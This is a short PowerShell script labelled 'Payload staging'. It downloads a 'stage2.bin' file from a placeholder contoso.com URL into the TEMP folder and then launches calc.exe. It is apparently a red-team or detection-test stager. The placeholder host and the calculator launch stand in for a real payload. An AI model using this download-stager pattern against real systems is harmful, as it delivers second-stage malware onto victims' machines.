<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://contoso.com:443/cdn/stage2.bin",
    [string]$WorkingPath = "$env:TEMP\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $WorkingPath)
Start-Process -FilePath 'calc.exe'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
